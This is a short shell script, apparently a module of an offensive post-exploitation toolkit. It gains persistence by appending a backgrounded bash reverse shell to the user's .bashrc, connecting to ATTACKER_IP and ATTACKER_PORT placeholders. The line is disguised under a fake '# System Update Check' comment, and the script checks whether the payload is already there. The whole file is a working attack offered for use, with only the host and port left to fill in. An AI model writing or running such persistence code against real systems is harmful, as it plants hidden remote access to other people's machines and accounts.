# Persistence via .bashrc
# Usage: load persistence/bashrc_poison.sh

print_header "Persistence: .bashrc Poisoning"

PAYLOAD="nohup /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >/dev/null 2>&1 &"
BASHRC="$HOME/.bashrc"

if [ -w "$BASHRC" ]; then
    if grep -q "nohup /bin/bash -c" "$BASHRC"; then
        print_warning "Payload already present in $BASHRC"
    else
        # Create a backup
        cp "$BASHRC" "$BASHRC.bak"
        print_success "Backed up .bashrc to $BASHRC.bak"
        
        # Append payload
        echo "" >> "$BASHRC"
        echo "# System Update Check" >> "$BASHRC"
        echo "$PAYLOAD" >> "$BASHRC"
        print_success "Injected payload into $BASHRC"
        print_with_label "Note: You must edit the file to set ATTACKER_IP and ATTACKER_PORT!"
    fi
else
    print_error "$BASHRC is not writable."
fi
